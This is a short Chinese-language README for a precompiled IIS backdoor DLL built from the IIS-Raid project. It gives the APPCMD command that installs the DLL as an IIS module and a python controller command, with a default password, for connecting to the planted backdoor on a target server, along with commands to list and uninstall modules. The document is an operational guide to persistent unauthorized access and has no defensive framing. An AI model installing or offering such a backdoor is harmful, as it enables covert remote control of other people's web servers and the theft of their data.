# README


已经编译好了的dll

####  

源码：https://github.com/0x09AL/IIS-Raid

  



####  

直接下载 IIS-backdoor.dll  

Windows server2012 IIS 8 测试

  


## 使用

### 添加模块

PS C:\Users\Administrator> C:\Windows\system32\inetsrv\APPCMD.EXE install module /name:Module  /image:"c:\IIS-Backdoor.dll" /add:true

### 运行python脚本连接DLL后门

python3 iis_controller.py --url target --password SIMPLEPASS

## 另外一些模块有关的命令

### 看一下已经安装的模块

PS C:\Users\Administrator> C:\Windows\system32\inetsrv\APPCMD.EXE list modules

### 删除已经安装的模块

PS C:\Users\Administrator> C:\Windows\system32\inetsrv\APPCMD.EXE uninstall modules Module
